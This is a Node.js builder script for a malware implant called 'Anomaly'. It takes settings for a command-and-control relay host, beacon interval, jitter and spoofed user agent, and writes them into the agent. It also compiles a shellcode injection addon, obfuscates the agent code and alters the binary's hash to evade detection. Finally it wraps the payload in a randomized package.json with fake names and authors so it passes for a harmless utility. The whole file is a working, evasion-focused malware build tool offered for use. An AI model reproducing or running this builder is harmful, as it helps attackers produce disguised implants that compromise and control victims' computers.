const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');
const { execSync } = require('child_process');

// Helper to prompt for input
function prompt(question, defaultValue = '') {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            rl.close();
            resolve(answer.trim() || defaultValue);
        });
    });
}

async function main() {
    console.log('==========================================');
    console.log('  Anomaly Agent Builder');
    console.log('==========================================');
    console.log('');

    // Check if dependencies are installed
    if (!fs.existsSync(path.join(__dirname, 'node_modules'))) {
        console.log('[+] Installing dependencies...');
        try {
            execSync('npm install', { stdio: 'inherit' });
            console.log('');
        } catch (err) {
            console.error('[!] npm install failed!');
            process.exit(1);
        }
    }

    // Check for javascript-obfuscator
    let JavaScriptObfuscator;
    try {
        JavaScriptObfuscator = require('javascript-obfuscator');
    } catch (err) {
        console.error('[!] javascript-obfuscator not found.');
        console.error('[!] Run: npm install');
        process.exit(1);
    }

    // Prompt for configuration
    const config = {
        host: await prompt('C2 Relay Host [localhost]: ', 'localhost'),
        port: await prompt('C2 Relay Port [8082]: ', '8082'),
        endpoint: await prompt('C2 Endpoint [/wiki]: ', '/wiki'),
        hmac: await prompt('HMAC Key (hex): '),
        interval: await prompt('Beacon Interval (seconds) [15]: ', '15'),
        jitter: await prompt('Jitter (seconds) [10]: ', '10'),
        ua: await prompt('User Agent [Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36]: ', 
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    };

    if (!config.hmac) {
        console.error('\n[ERROR] HMAC key is required!');
        process.exit(1);
    }

    console.log('');
    console.log('Configuration:');
    console.log(`  Host:            ${config.host}`);
    console.log(`  Port:            ${config.port} (HTTPS)`);
    console.log(`  Endpoint:        ${config.endpoint}`);
    console.log(`  HMAC Key:        ${config.hmac.substring(0, 16)}...${config.hmac.substring(config.hmac.length - 8)}`);
    console.log(`  Beacon Interval: ${config.interval}s`);
    console.log(`  Jitter:          ${config.jitter}s`);
    console.log('');

    // Build native addon
    console.log('[+] Building native shellcode injection addon...');
    try {
        execSync('npm run build:addon', { stdio: 'inherit' });
        console.log('');
    } catch (err) {
        console.error('\n[!] Native addon build failed!');
        console.error('[!] Make sure you have Visual Studio Build Tools installed.');
        console.error('[!] Download from: https://visualstudio.microsoft.com/downloads/');
        process.exit(1);
    }

    buildPayload(config, JavaScriptObfuscator);
}

function buildPayload(config, JavaScriptObfuscator) {

// Directories
const sourceDir = __dirname;
const outputDir = path.join(__dirname, 'app');
const buildDir = path.join(__dirname, 'build', 'Release');

// Random metadata
const names = ['dev-helper', 'code-tool', 'app-manager', 'system-util', 'data-sync'];
const authors = ['Alex Smith', 'Jordan Lee', 'Taylor Brown', 'Morgan Davis', 'Casey Wilson'];
const descriptions = [
    'A utility for system management',
    'Development helper tool',
    'Application management system',
    'Data synchronization utility'
];
const licenses = ['MIT', 'Apache-2.0', 'ISC', 'BSD-3-Clause'];

function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomVersion() {
    return `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

function hashFile(filePath) {
    const fileBuffer = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(fileBuffer).digest('hex');
}

console.log('[+] Building Anomaly payload...\n');

// Reset output directory
if (fs.existsSync(outputDir)) {
    fs.rmSync(outputDir, { recursive: true, force: true });
}
fs.mkdirSync(outputDir, { recursive: true });

// Inject configuration into main.js
console.log('[+] Injecting configuration...');
let mainCode = fs.readFileSync(path.join(sourceDir, 'main.js'), 'utf-8');

// Replace configuration values
mainCode = mainCode.replace(
    /const LISTENER_HOST = process\.env\.ANOMALY_HOST \|\| '[^']*';/,
    `const LISTENER_HOST = process.env.ANOMALY_HOST || '${config.host}';`
);
mainCode = mainCode.replace(
    /const LISTENER_PORT = process\.env\.ANOMALY_PORT \|\| '[^']*';/,
    `const LISTENER_PORT = process.env.ANOMALY_PORT || '${config.port}';`
);
mainCode = mainCode.replace(
    /const LISTENER_ENDPOINT = process\.env\.ANOMALY_ENDPOINT \|\| '[^']*';/,
    `const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '${config.endpoint}';`
);
mainCode = mainCode.replace(
    /const HMAC_KEY = process\.env\.ANOMALY_HMAC_KEY \|\| '[^']*';/,
    `const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '${config.hmac}';`
);
mainCode = mainCode.replace(
    /const RECONNECT_INTERVAL = parseInt\(process\.env\.ANOMALY_INTERVAL \|\| '[^']*', 10\);/,
    `const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '${config.interval}', 10);`
);
mainCode = mainCode.replace(
    /const JITTER_SECONDS = parseInt\(process\.env\.ANOMALY_JITTER \|\| '[^']*', 10\);/,
    `const JITTER_SECONDS = parseInt(process.env.ANOMALY_JITTER || '${config.jitter}', 10);`
);
if (config.ua) {
    mainCode = mainCode.replace(
        /const USER_AGENT = process\.env\.ANOMALY_USER_AGENT \|\| '[^']*';/,
        `const USER_AGENT = process.env.ANOMALY_USER_AGENT || '${config.ua}';`
    );
}

// Obfuscate main.js
console.log('[+] Obfuscating main.js...');
const obfuscatedMain = JavaScriptObfuscator.obfuscate(mainCode, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.5,
    stringArrayEncoding: ['rc4'],
    stringArrayThreshold: 0.75,
    splitStrings: true,
    splitStringsChunkLength: 5
}).getObfuscatedCode();
fs.writeFileSync(path.join(outputDir, 'main.js'), obfuscatedMain);

// Modify inject.node PE binary to change hash
const injectSrc = path.join(buildDir, 'inject.node');
const injectDst = path.join(outputDir, 'inject.node');

if (fs.existsSync(injectSrc)) {
    console.log('[+] Modifying inject.node hash...');
    
    const injectBuffer = fs.readFileSync(injectSrc);
    
    // Append random junk bytes to change hash
    const junkBytes = crypto.randomBytes(256);
    const modifiedBuffer = Buffer.concat([injectBuffer, junkBytes]);
    
    fs.writeFileSync(injectDst, modifiedBuffer);
    
    console.log(`    Original hash: ${hashFile(injectSrc).substring(0, 16)}...`);
    console.log(`    Modified hash: ${hashFile(injectDst).substring(0, 16)}...`);
} else {
    console.error('[!] inject.node not found. Make sure to build the native addon first.');
    process.exit(1);
}

// Create build directory structure
fs.mkdirSync(path.join(outputDir, 'build', 'Release'), { recursive: true });
fs.copyFileSync(injectDst, path.join(outputDir, 'build', 'Release', 'inject.node'));
fs.unlinkSync(injectDst);

// Generate randomized package.json
console.log('[+] Generating randomized package.json...');
const pkgData = {
    name: randomChoice(names),
    version: randomVersion(),
    description: randomChoice(descriptions),
    main: 'main.js',
    author: randomChoice(authors),
    license: randomChoice(licenses),
    keywords: ['utility', 'tool', 'helper'],
    engines: {
        node: '>=14.0.0'
    }
};
fs.writeFileSync(path.join(outputDir, 'package.json'), JSON.stringify(pkgData, null, 2));

console.log('\n[+] Payload build complete!');
console.log('    Output directory: ./app');
    console.log(`    Package: ${pkgData.name} v${pkgData.version}`);
    console.log('');
    console.log('==========================================');
    console.log('  Build Complete!');
    console.log('==========================================');
    console.log('  Output: ./app directory');
    console.log('  Run: node app/main.js');
    console.log('==========================================');
}

// Run the main function
main().catch(err => {
    console.error('[!] Build failed:', err.message);
    process.exit(1);
});

